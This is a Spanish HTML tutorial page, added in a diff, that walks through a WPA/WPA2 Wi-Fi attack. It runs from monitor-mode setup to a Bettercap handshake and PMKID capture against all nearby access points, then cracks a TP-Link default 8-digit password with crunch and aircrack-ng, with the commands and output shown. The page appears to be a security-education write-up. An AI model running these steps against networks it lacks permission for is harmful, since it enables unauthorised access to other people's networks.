@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ataque WiFi - Captura de Handshake WPA/WPA2</title>
+    <!-- Added Google Fonts links to match other HTML documents -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="article-style.css">
+    <!-- Removed inline styles that were causing display issues -->
+</head>
+<body>
+    <!-- Added navbar to match other documents -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <!-- Added link to home page on logo -->
+            <a href="index.html" style="text-decoration: none; color: inherit;"><span class="nav-logo">Ernesto Villar</span></a>
+        </div>
+        <div class="nav-right">
+            <ul>
+                <li><a href="#" class="active">Documentación</a></li>
+                <!-- Changed from PDF download to Notion link for WiFi Attack -->
+                <li><a href="https://boiled-reward-eb4.notion.site/Ataque-wifi-1bed9b177cd180a3b687d4951fe2eb13" target="_blank" class="download-btn" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 12px rgba(102, 126, 234, 0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                    <polyline points="15 3 21 3 21 9"></polyline>
+                    <line x1="10" y1="14" x2="21" y2="3"></line>
+                  </svg>
+                  Ver en Notion
+                </a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Wrapped content in article-container for proper styling -->
+    <article class="article-container">
+        <header class="article-header">
+            <h1 class="article-title">Ataque WiFi</h1>
+            <p class="article-subtitle">Captura de Handshake WPA/WPA2 y Descifrado de Contraseñas</p>
+            <div class="article-meta">
+                <span class="author">Por Ernesto Villar</span>
+            </div>
+        </header>
+
+        <!-- Added table of contents navigation -->
+        <nav class="table-of-contents">
+          <h2>Contenido</h2>
+          <ul>
+            <li><a href="#pasos-previos">Pasos previos</a>
+              <ul>
+                <li><a href="#clonar-repositorio">Clonar repositorio</a></li>
+                <li><a href="#scripts-incluidos">Scripts incluidos</a></li>
+              </ul>
+            </li>
+            <li><a href="#comprobaciones">Comprobaciones</a></li>
+            <li><a href="#bettercap">Bettercap - Captura del handshake</a></li>
+            <li><a href="#explicacion-pcap">Explicación captura tráfico de red pcap</a></li>
+            <li><a href="#paquetes-eapol">Paquetes EAPOL - El 4-way Handshake</a></li>
+            <li><a href="#proceso-autenticacion">Proceso de Autenticación Wi-Fi (EAPOL)</a></li>
+            <li><a href="#contrasena-wpa">¿Qué es la contraseña y cómo se usa en WPA/WPA2?</a></li>
+            <li><a href="#handshake-capturado">Handshake capturado</a></li>
+            <li><a href="#aircrack-ng">aircrack-ng - Descifrado de la contraseña</a></li>
+          </ul>
+        </nav>
+
+        <section id="pasos-previos" class="article-section">
+            <h2>Pasos previos</h2>
+            
+            <h3 id="clonar-repositorio">Clonar repositorio</h3>
+            <p>Para la instalación de drivers vamos a clonar un repositorio que contiene los drivers para la antena Wi-Fi <strong>Realtek RTL8188EUS</strong> junto con una serie de scripts que he creado personalmente para simplificar y automatizar el proceso de instalación y configuración en sistemas basados en Linux.</p>
+            
+            <pre><code>git clone https://github.com/ernestoo-v/Realtek-RTL8188EUS-drivers.git</code></pre>
+
+            <h3 id="scripts-incluidos">Scripts incluidos</h3>
+            
+            <h4>install_linux_headers.sh</h4>
+            <pre><code>#!/bin/bash
+# Pregunta si el usuario desea instalar los encabezados de Linux
+read -p "¿Quieres instalar linux-headers-generic? [y/N]: " install_choice
+
+if [[ "$install_choice" =~ ^[Yy] ]]; then
+    echo "Actualizando listas de paquetes..."
+    sudo apt update
+    
+    echo "Instalando linux-headers-generic..."
+    sudo apt install -y linux-headers-generic
+    
+    echo "Por favor, reinicia tu máquina para aplicar los cambios."
+else
+    echo "Omitiendo la instalación de los encabezados de Linux."
+fi</code></pre>
+
+            <h4>setup.sh (instalar drivers)</h4>
+            <pre><code>#!/bin/bash
+# Actualiza la lista de paquetes
+sudo apt update
+
+# Verifica e instala los encabezados del kernel
+KERNEL_VERSION=$(uname -r)
+
+if [ ! -d "/usr/src/linux-headers-$KERNEL_VERSION" ]; then
+    echo "Instalando linux-headers-$KERNEL_VERSION..."
+    sudo apt-get install -y bc
+    sudo apt install -y bc linux-headers-$KERNEL_VERSION
+    
+    if [ $? -ne 0 ]; then
+        echo "Error: No se pudieron instalar los encabezados."
+        exit 1
+    fi
+else
+    echo "Los encabezados ya están instalados."
+fi
+
+# Elimina el módulo existente si está cargado
+sudo rmmod r8188eu.ko 2>/dev/null || true
+
+# Entra al directorio de los drivers
+cd drivers || { echo "Error: Directorio 'drivers' no encontrado."; exit 1; }
+
+# Escribe el archivo de configuración como root con tee
+echo "blacklist r8188eu.ko" | sudo tee /etc/modprobe.d/realtek.conf
+
+# Compila e instala el driver
+make || { echo "Error en 'make'."; exit 1; }
+sudo make install || { echo "Error en 'make install'."; exit 1; }
+
+# Carga el módulo del driver
+sudo modprobe 8188eu
+
+echo "Instalación completada con éxito."</code></pre>
+
+            <h4>startWifi.sh (inicializar la antena)</h4>
+            <pre><code>#!/bin/bash
+# Carga el módulo específico '8188eu' para el chipset Realtek RTL8188EUS
+sudo modprobe 8188eu
+
+# Reinicia NetworkManager para refrescar las conexiones de red y reconocer 
+# los cambios en los drivers
+sudo systemctl restart NetworkManager
+
+# Pide al usuario que desconecte y vuelva a conectar el adaptador Wi-Fi USB
+echo "Por favor, desconecta el adaptador Wi-Fi USB y vuelve a conectarlo."
+
+# Pide al usuario que presione Enter cuando haya reconectado el adaptador
+echo "Presiona Enter cuando estés listo..."
+read -r
+
+# Informa que el script está esperando a que la interfaz 'wlan0' aparezca
+echo "Esperando a que 'wlan0' aparezca..."
+
+# Inicia un bucle que se ejecuta hasta que 'wlan0' sea detectada
+while true; do
+    # Verifica si 'wlan0' está presente sin mostrar errores
+    if iwconfig 2>/dev/null | grep -q "wlan0"; then
+        # Si 'wlan0' es detectada, imprime un mensaje y sale del bucle
+        echo "'wlan0' detectada!"
+        break
+    fi
+    # Pausa durante 2 segundos antes de verificar nuevamente
+    sleep 2
+done
+
+# Informa que el adaptador Wi-Fi USB ha sido reconectado exitosamente
+echo "Wi-Fi USB reconectado con éxito."
+
+# Termina procesos que podrían interferir con el modo monitor
+sudo airmon-ng check kill
+
+# Pone la interfaz 'wlan0' en modo monitor
+sudo airmon-ng start wlan0
+
+# Asegura que la interfaz 'wlan0' esté activada
+sudo ifconfig wlan0 up</code></pre>
+
+            <p>Si el script se ha ejecutado con éxito, veremos el siguiente mensaje:</p>
+            
+            <pre><code>Please disconnect the WiFi USB adapter and reconnect it.
+Press Enter when you are ready...
+Waiting for 'wlan0' to appear...
+'wlan0' detected!
+WiFi USB reconnected successfully.
+
+Killing these processes:
+    PID Name
+   2571 wpa_supplicant
+
+PHY     Interface    Driver        Chipset
+phy1    wlan0        8188eu        TP-Link TL-WN722N v2/v3 - Realtek RTL8188EUS
+
+(monitor mode enabled)</code></pre>
+
+            <p class="info-box">
+                <strong>Nota:</strong> Si estamos en máquina virtual, debemos activar la antena en la parte de USB.
+            </p>
+        </section>
+
+        <section id="comprobaciones" class="article-section">
+            <h2>Comprobaciones</h2>
+            <p>Realizamos una serie de comprobaciones:</p>
+
+            <h3>Comando airmon-ng</h3>
+            <pre><code>sudo airmon-ng</code></pre>
+
+            <p><code>airmon-ng</code> es una herramienta de la suite Aircrack-ng diseñada para gestionar interfaces inalámbricas en sistemas Linux. Permite, entre otras cosas, habilitar o deshabilitar el modo monitor en un adaptador Wi-Fi.</p>
+
+            <p><strong>Propósito de la comprobación:</strong></p>
+            <p>Cuando ejecutas <code>sudo airmon-ng</code> sin opciones adicionales, muestra una lista de las interfaces inalámbricas disponibles en tu sistema, junto con detalles como el nombre de la interfaz (por ejemplo, wlan0), el driver y el chipset que utiliza.</p>
+
+            <p><strong>Ejemplo de salida:</strong></p>
+            <pre><code>PHY     Interface    Driver        Chipset
+phy1    wlan0        8188eu        TP-Link TL-WN722N v2/v3 - Realtek RTL8188EUS</code></pre>
+
+            <h3>Comando iwconfig</h3>
+            <pre><code>iwconfig</code></pre>
+
+            <p><code>iwconfig</code> es una herramienta de línea de comandos en Linux que muestra y configura información sobre interfaces inalámbricas. Es similar a <code>ifconfig</code>, pero está especializada en redes Wi-Fi.</p>
+
+            <p><strong>Propósito de la comprobación:</strong></p>
+            <p>Al ejecutar <code>iwconfig</code> sin opciones, obtienes detalles sobre todas las interfaces inalámbricas del sistema, incluyendo el modo en el que están operando (por ejemplo, <code>Mode:Managed</code> para modo administrado o <code>Mode:Monitor</code> para modo monitor), la frecuencia, el ESSID, la potencia de la señal, etc.</p>
+
+            <p>Se usa específicamente para ver si está en modo monitor.</p>
+
+            <p><strong>Ejemplo de salida:</strong></p>
+            <pre><code>lo        no wireless extensions.
+eth0      no wireless extensions.
+wlan0     unassociated  Nickname:"WIFI-REALTEK"
+          Mode:Monitor  Frequency=2.457 GHz  Access Point: Not-Associated   
+          Sensitivity:0/0  
+          Retry:off   RTS thr:off   Fragment thr:off
+          Power Management:off
+          Link Quality:0  Signal level:0  Noise level:0
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0</code></pre>
+
+            <h3>Comando sudo ip link show</h3>
+            <pre><code>sudo ip link show</code></pre>
+
+            <p>Si estás usando herramientas como Bettercap o realizando auditorías de redes Wi-Fi, necesitas que la interfaz esté activa para capturar tráfico. Si acabas de configurar una interfaz (por ejemplo, con <code>airmon-ng start wlan0</code> para modo monitor), verificar con <code>sudo ip link show</code> te asegura que todo está listo.</p>
+
+            <p>Si estás usando herramientas como Bettercap o realizando auditorías de redes Wi-Fi, necesitas que la interfaz (normalmente en modo monitor, como wlan0mon) esté activa para capturar tráfico.</p>
+
+            <p><strong>Ejemplo de salida:</strong></p>
+            <pre><code>6: wlan0: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 2312 qdisc mq state UP mode DEFAULT group default qlen 1000
+    link/ieee802.11/radiotap 32:8a:d2:98:79:66 brd ff:ff:ff:ff:ff:ff permaddr d8:44:89:91:92:0d</code></pre>
+        </section>
+
+        <section id="bettercap" class="article-section">
+            <h2>Bettercap - Captura del handshake</h2>
+
+            <h3>¿Qué hace Bettercap en este ataque?</h3>
+            <p>Bettercap es una herramienta de seguridad de redes versátil que se utiliza para realizar auditorías y ataques, incluyendo operaciones contra redes Wi-Fi. En el contexto del ataque PMKID, Bettercap desempeña las siguientes funciones:</p>
+
+            <ul>
+                <li><strong>Modo monitor:</strong> Configura la interfaz Wi-Fi en modo monitor para capturar tráfico inalámbrico.</li>
+                <li><strong>Escaneo de redes:</strong> Detecta puntos de acceso y clientes cercanos.</li>
+                <li><strong>Solicitudes de asociación:</strong> Envía solicitudes de asociación a los puntos de acceso para provocar que respondan con paquetes que contengan el PMKID.</li>
+                <li><strong>Captura y almacenamiento:</strong> Guarda los PMKID capturados en un archivo para su análisis posterior.</li>
+            </ul>
+
+            <p>En esencia, Bettercap simplifica y automatiza el proceso de escaneo, asociación y captura del PMKID, haciendo que el ataque sea más accesible y eficiente.</p>
+
+            <h3>Pasos</h3>
+
+            <h4>1. Iniciamos Bettercap y especificamos la interfaz de red que se va a utilizar.</h4>
+            <pre><code>sudo bettercap -iface wlan0</code></pre>
+
+            <p><code>-iface wlan0</code>: Indica que la interfaz wlan0 (tu adaptador Wi-Fi) será utilizada para las operaciones.</p>
+
+            <div class="image-container">
+                <img src="images/bettercap-start.png" alt="Iniciando Bettercap" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+            </div>
+
+            <h4>2. Dentro de bettercap: Activar el modo de reconocimiento para escanear redes Wi-Fi cercanas.</h4>
+            <pre><code>wifi.recon on</code></pre>
+
+            <p><code>wifi.recon</code>: Es el módulo de Bettercap encargado de escanear redes inalámbricas. Bettercap comienza a buscar redes Wi-Fi en el entorno, recopilando información sobre puntos de acceso y clientes.</p>
+
+            <h4>3. Mostrar una lista de las redes Wi-Fi detectadas durante el escaneo.</h4>
+            <pre><code>wifi.show</code></pre>
+
+            <p><code>wifi.show</code>: Comando que presenta en pantalla los datos recopilados por el módulo.</p>
+
+            <p>Obtenemos una tabla con detalles como el BSSID (dirección MAC del AP), SSID (nombre de la red), canal, tipo de cifrado, etc. Esto te ayuda a identificar la red objetivo.</p>
+
+            <div class="image-container">
+                <img src="images/wifi-show-output.png" alt="Salida de wifi.show" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+            </div>
+
+            <h4>4. Intentar asociarse con todos los puntos de acceso detectados para capturar sus PMKID.</h4>
+            <pre><code>wifi.assoc all</code></pre>
+
+            <p><code>wifi.assoc</code>: Envía solicitudes de asociación a los puntos de acceso.</p>
+            <p><code>all</code>: Indica que el comando se aplicará a todos los AP visibles.</p>
+
+            <p>Bettercap envía solicitudes a cada punto de acceso, intentando obtener el PMKID. Si tiene éxito, los PMKID capturados se almacenan para su uso posterior.</p>
+
+            <div class="image-container">
+                <img src="images/wifi-assoc-all.png" alt="Ejecutando wifi.assoc all" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+            </div>
+
+            <p>Vemos que la captura de red se nos guarda en <code>/root/bettercap-wifi-handshakes.pcap</code></p>
+        </section>
+
+        <section id="explicacion-pcap" class="article-section">
+            <h2>Explicación captura tráfico de red pcap</h2>
+
+            <p>Al abrir la captura obtenida con bettercap, y al filtrar por protocolo EAPOL (Extensible Authentication Protocol over LAN), vemos el siguiente resultado:</p>
+
+            <div class="image-container">
+                <img src="images/wireshark-eapol.png" alt="Wireshark mostrando tráfico EAPOL" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+            </div>
+
+            <p>El protocolo <strong>EAPOL (Extensible Authentication Protocol over LAN)</strong>, que forma parte del estándar 802.1X y se utiliza en redes WPA/WPA2 para establecer conexiones seguras mediante el 4-way handshake. Además, hay paquetes con el protocolo MXCHIPInform, que parece ser un protocolo propietario de dispositivos IoT fabricados por MXCHIP, una empresa conocida por módulos Wi-Fi e IoT. Este tráfico refleja intentos de conexión de dispositivos como un Xiaomi y otros clientes a la red.</p>
+        </section>
+
+        <section id="paquetes-eapol" class="article-section">
+            <h2>Paquetes EAPOL - El 4-way Handshake</h2>
+
+            <p>La mayor parte del tráfico en el .pcap corresponde al <strong>4-way handshake de WPA/WPA2</strong>, un proceso de cuatro pasos que permite al punto de acceso (TP-Link) y los dispositivos clientes acordar claves de cifrado seguras para la comunicación. Este handshake incluye cuatro mensajes clave:</p>
+
+            <ol>
+                <li><strong>Mensaje 1 de 4:</strong> Enviado por el punto de acceso al cliente. Contiene el ANonce (un valor aleatorio generado por el autenticador) para iniciar el proceso de generación de claves.</li>
+                
+                <li><strong>Mensaje 2 de 4:</strong> Enviado por el cliente al punto de acceso. Incluye el SNonce (un valor aleatorio del cliente) y un MIC (Message Integrity Code) para verificar la integridad del mensaje.</li>
+                
+                <li><strong>Mensaje 3 de 4:</strong> Enviado por el punto de acceso al cliente. Confirma la instalación de la PTK (Pairwise Transient Key, clave temporal para la comunicación entre el punto de acceso y el cliente) y la GTK (Group Temporal Key, clave para tráfico multicast).</li>
+                
+                <li><strong>Mensaje 4 de 4:</strong> Enviado por el cliente al punto de acceso. Confirma que el handshake se ha completado y las claves están instaladas.</li>
+            </ol>
+        </section>
+
+        <section id="proceso-autenticacion" class="article-section">
+            <h2>Proceso de Autenticación Wi-Fi (EAPOL)</h2>
+
+            <p>El tráfico EAPOL muestra que varios dispositivos están intentando conectarse a una red Wi-Fi gestionada por el TP-Link. Cada intento de conexión genera un 4-way handshake:</p>
+
+            <ul>
+                <li>El TP-Link envía el <strong>Mensaje 1</strong> con el ANonce (paquetes 5, 11, 54, 9).</li>
+                <li>El cliente responde con el <strong>Mensaje 2</strong>, enviando su SNonce y MIC (paquetes 55, 1 y 50, 0).</li>
+                <li>El TP-Link envía el <strong>Mensaje 3</strong>, confirmando las claves PTK y GTK (paquetes 54, 7 y 50, 3).</li>
+                <li>El cliente finaliza con el <strong>Mensaje 4</strong>, confirmando el éxito (paquete 51, 2).</li>
+            </ul>
+        </section>
+
+        <section id="contrasena-wpa" class="article-section">
+            <h2>¿Qué es la contraseña y cómo se usa en WPA/WPA2?</h2>
+
+            <p>La contraseña de la red Wi-Fi (también conocida como <strong>PSK, Pre-Shared Key</strong>, en WPA Personal) se utiliza para derivar una clave maestra llamada <strong>PMK (Pairwise Master Key)</strong>. La PMK se genera a partir de:</p>
+
+            <ul>
+                <li>La contraseña (PSK).</li>
+                <li>El nombre de la red (ESSID).</li>
+                <li>Un proceso de derivación usando el algoritmo <strong>PBKDF2 (Password-Based Key Derivation Function 2)</strong>, que aplica 4096 iteraciones de HMAC-SHA1 para hacer que el proceso sea más seguro.</li>
+            </ul>
+
+            <p>La PMK, junto con el ANonce, SNonce y las direcciones MAC del AP y el cliente, se usa para generar la <strong>PTK (Pairwise Transient Key)</strong>, que es la clave temporal que cifra la comunicación entre el cliente y el AP.</p>
+        </section>
+
+        <section id="handshake-capturado" class="article-section">
+            <h2>Handshake capturado</h2>
+
+            <p>Si conseguimos capturar un handshake, este aparecerá en el archivo <code>/root/bettercap-wifi-handshakes.pcap</code>. Este handshake contendrá:</p>
+
+            <ul>
+                <li>El ANonce y SNonce.</li>
+                <li>El MIC (Message Integrity Code) del Mensaje 2.</li>
+                <li>Las direcciones MAC del AP y el cliente.</li>
+                <li>El ESSID.</li>
+            </ul>
+
+            <p>Estos datos son suficientes para que aircrack-ng intente descifrar la contraseña.</p>
+        </section>
+
+        <section id="aircrack-ng" class="article-section">
+            <h2>aircrack-ng - Descifrado de la contraseña</h2>
+
+            <h3>Explicación</h3>
+            <p><code>aircrack-ng</code> es una herramienta diseñada para analizar archivos de captura de tráfico Wi-Fi (como archivos .pcap) y buscar información útil, como handshakes WPA/WPA2 o PMKID, que son necesarios para intentar descifrar contraseñas de redes Wi-Fi.</p>
+
+            <pre><code>sudo aircrack-ng /root/bettercap-wifi-handshakes.pcap</code></pre>
+
+            <p>Cuando ejecutamos este comando, aircrack-ng examina el archivo .pcap y muestra una lista de redes Wi-Fi detectadas, junto con detalles sobre si se capturó un handshake completo o un PMKID para cada una. Estos elementos son esenciales para intentar descifrar la contraseña mediante un ataque de fuerza bruta o con un diccionario.</p>
+
+            <div class="image-container">
+                <img src="images/aircrack-networks.png" alt="Salida de aircrack-ng mostrando redes detectadas" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+            </div>
+
+            <ul>
+                <li>La red número 6 <strong>TP-Link_9A88</strong> tiene 1 handshake capturado, lo que la hace ideal para intentar descifrar su contraseña.</li>
+                <li>Varias redes tienen PMKID capturados, pero no handshakes completos. También se podría trabajar con estas, pero el handshake de la red 6 es el más prometedor por ahora.</li>
+            </ul>
+
+            <h3>Proceso para sacar contraseña</h3>
+
+            <p>Se requerirá de un diccionario de contraseñas, un archivo de texto con una lista de posibles contraseñas (una por línea).</p>
+
+            <p>Dado que el punto de acceso objetivo es un router TP-Link, y según la información disponible, los routers TP-Link suelen venir con una contraseña Wi-Fi por defecto de <strong>8 dígitos numéricos</strong> (impresa en la etiqueta del dispositivo), se procederá a generar un diccionario con todas las combinaciones posibles de 8 dígitos (de 00000000 a 99999999). Este diccionario se utilizará con aircrack-ng para intentar descifrar la contraseña de la red TP-Link_9A88, que tiene un handshake capturado, verificando si la contraseña actual coincide con el formato por defecto del fabricante.</p>
+
+            <p>Podríamos generar un script en Python para generar un diccionario con todas las combinaciones de 8 dígitos numéricos (desde 00000000 hasta 99999999):</p>
+
+            <pre><code># Script para generar un diccionario con todas las combinaciones de 8 dígitos numéricos
+
+# Abrimos un archivo para escribir las combinaciones
+with open('diccionario_8_digitos.txt', 'w') as f:
+    # Iteramos desde 0 hasta 99999999
+    for i in range(100000000):
+        # Convertimos el número a string con 8 dígitos, rellenando con ceros a la izquierda
+        contraseña = f"{i:08d}"
+        # Escribimos la contraseña en el archivo con un salto de línea
+        f.write(contraseña + "\n")
+
+print("Diccionario generado: diccionario_8_digitos.txt")</code></pre>
+
+            <p>Pero, debido a las limitaciones de generar y almacenar un diccionario tan grande, una mejor opción es generar las contraseñas dinámicamente durante el proceso de cracking. Puedes usar <code>crunch</code> en combinación con <code>aircrack-ng</code>. Por ejemplo:</p>
+
+            <pre><code>crunch 8 8 0123456789 | aircrack-ng -w - -b (introducir BSSID) /root/bettercap-wifi-handshakes.pcap</code></pre>
+
+            <h4>Explicación del comando:</h4>
+            <ul>
+                <li><code>crunch 8 8 0123456789</code>: Genera todas las combinaciones de 8 dígitos usando los números del 0 al 9.</li>
+                <li><code>|</code>: Pasa las contraseñas generadas directamente a aircrack-ng a través de un pipe, sin necesidad de almacenarlas en un archivo.</li>
+                <li><code>-w -</code>: Indica a aircrack-ng que lea las contraseñas desde la entrada estándar.</li>
+                <li><code>-b BSSID</code>: Especifica el BSSID de la red TP-Link_9A88.</li>
+                <li><code>/root/bettercap-wifi-handshakes.pcap</code>: Ruta al archivo de captura que contiene el handshake.</li>
+            </ul>
+
+            <p>Si tiene éxito, se verá algo como:</p>
+
+            <pre><code>                               Aircrack-ng 1.7 
+
+      [00:00:00] 1/1 keys tested (44.61 k/s) 
+
+      Time left: --
+
+                        KEY FOUND! [ 48392017 ]
+
+      Master Key      : AA E4 8E 1D 89 FB 08 01 97 A8 F2 51 A0 9C 35 B7 
+                        C2 3E 60 01 C7 B5 BA 6D 5C D7 B7 69 2B 40 FB 58 
+
+      Transient Key   : 1A 31 C8 C0 5C 7D 0A F8 F8 43 B9 14 A4 22 FB D2 
+                        CB AB CD 32 50 D2 5B 6E 81 0A D7 EB 0E 6B FE 7A 
+                        A9 86 79 E9 13 7E 9E ED 5D 34 2D 70 8F BC 78 EF 
+                        87 C7 E7 EE 10 D4 B0 D0 DB 6D EF 1B 05 94 5A 15 
+
+      EAPOL HMAC      : A5 2C DB 24 29 E0 E1 13 2D E7 2B 70 5B 38 96 E0</code></pre>
+        </section>
+
+        <footer class="article-footer">
+            <p>Documento educativo sobre seguridad de redes - Ernesto Villar</p>
+        </footer>
+    </article>
+</body>
+</html>
